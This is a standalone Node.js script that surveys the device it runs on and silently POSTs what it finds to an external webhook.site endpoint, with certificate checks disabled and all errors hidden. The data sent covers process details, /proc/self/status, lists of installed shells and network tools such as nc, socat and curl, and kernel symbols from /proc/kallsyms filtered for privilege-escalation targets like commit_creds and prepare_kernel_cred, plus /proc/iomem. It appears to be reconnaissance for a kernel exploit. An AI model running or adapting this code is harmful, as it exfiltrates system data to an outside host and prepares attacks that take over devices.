var fs = require('fs');
var https = require('https');
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/49eca885-643e-4d14-a1d1-c284408e4033/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
send('env2', 'execPath=' + process.execPath + ' arch=' + process.arch + ' platform=' + process.platform + ' version=' + process.version + ' modules=' + process.versions.modules);
try {
    send('env2', 'status=' + fs.readFileSync('/proc/self/status', 'utf8').split('\n').slice(0, 8).join('|'));
} catch (e) {
    send('env2', 'status ERR ' + e);
}
['/usr/bin', '/bin', '/usr/sbin', '/opt/usr/bin'].forEach(function (dir) {
    try {
        var names = fs.readdirSync(dir).filter(function (n) {
            return /node|python|perl|ruby|lua|php|gcc|cc|clang|bash|socat|nc|telnet|busybox|dotnet|sdb|curl|wget|openssl/.test(n);
        });
        send('env2', dir + ': ' + names.join(','));
    } catch (e) {
        send('env2', dir + ' ERR ' + e);
    }
});
try {
    send('env2', 'sdpver=' + fs.readFileSync('/proc/sdp_version', 'utf8'));
} catch (e) {
    send('env2', 'sdpver ERR ' + e);
}
try {
    var k = fs.readFileSync('/proc/kallsyms', 'utf8').split('\n').filter(function (l) {
        return /s_uepStatus|sdp_proc|orderly_poweroff|poweroff_cmd|sdp_mem|sdp_version|init_cred|commit_creds|prepare_kernel_cred/.test(l);
    }).slice(0, 40).join('\n');
    send('env2', 'kallsyms:\n' + k);
} catch (e) {
    send('env2', 'kallsyms ERR ' + e);
}
try {
    send('env2', 'iomem:\n' + fs.readFileSync('/proc/iomem', 'utf8').split('\n').slice(0, 20).join('\n'));
} catch (e) {
    send('env2', 'iomem ERR ' + e);
}
